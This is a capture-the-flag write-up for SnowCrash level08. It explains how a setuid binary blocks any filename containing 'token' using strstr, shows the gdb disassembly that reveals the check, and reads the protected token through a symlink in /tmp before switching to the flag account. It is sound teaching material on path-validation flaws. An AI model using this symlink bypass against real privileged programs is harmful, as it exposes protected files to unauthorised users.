# LEVEL08

## Analysis

## Enumeration

Here we have two interesting files, a binary, `level08`, and a file called `token` that belongs to `flag08`, so we cannot read it.
```bash
    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

## Investigation

`level08` takes a `file to read` as argument:
```bash
    $ ./level08
    ./level08 [file to read]
```
Though it remains still impossible to use `token`:
```bash
    $ ./level08 token
    You may not access 'token'
```

The distinct error message suggests the binary performs an explicit filename validation before attempting file access:
```bash
    $ ./level08 .profile
    level08: Unable to open .profile: Permission denied
```

If we run `level08` in gdb and disassemble the main we can find interesting `test` and `jmp` instructions:
```asm
    [...]
    0x080485af <+91>:    mov    DWORD PTR [esp+0x4],0x8048793
    0x080485b7 <+99>:    mov    DWORD PTR [esp],eax
    0x080485ba <+102>:   call   0x8048400 <strstr@plt>
    0x080485bf <+107>:   test   eax,eax
    0x080485c1 <+109>:   je     0x80485e9 <main+149>
    [...]
```

N.B: To switch from AT&T to intel notation use `set disassembly-flavor intel` in gdb.

The program prepares arguments for `strstr` on the stack according to the 32-bit calling convention: a value located in 0x8048793 (in esp+4), and `eax` that must contain our filename in esp+0. Then `strstr` is called control check if the string loaded appears in our input string. As a reminder, in 32 bits calling convention functions uses values in the stack as parameters and strstr prototype is `char *strstr(const char *haystack, const char *needle)`.

By inspecting the referenced memory address we confirm the comparison string is `token`:
```
    (gdb) b *0x080485af
    Breakpoint 1 at 0x80485af: file level08.c, line 18.
    (gdb) run
    (gdb) x/s 0x8048793
    0x8048793:       "token"
```

## Vulnerability

The program validates the pathname, not the actual resolved file. This introduces a symbolic link bypass vulnerability.

## Exploitation Strategy

One way to trick this program is to use symbolic Linux links. A symlink points to another file. 
```txt
    `ln -s <full path to file> <path to new file>`
```
We create a new file with a different name locally that points to the file we want to read. When the file is opened, the filesystem resolves the symbolic link to the protected token file, allowing its contents to be read.
```bash
    $ ln -s  /home/user/level08/token /tmp/flag
    $ ./level08 /tmp/flag
    XXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Result

```bash
    level08@SnowCrash:~$ su flag08
    Password: 
    Don't forget to launch getflag !
    flag08@SnowCrash:~$ getflag
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Takeaways

- Insufficient path validation or filename blacklist bypass introduces vulnerabilities.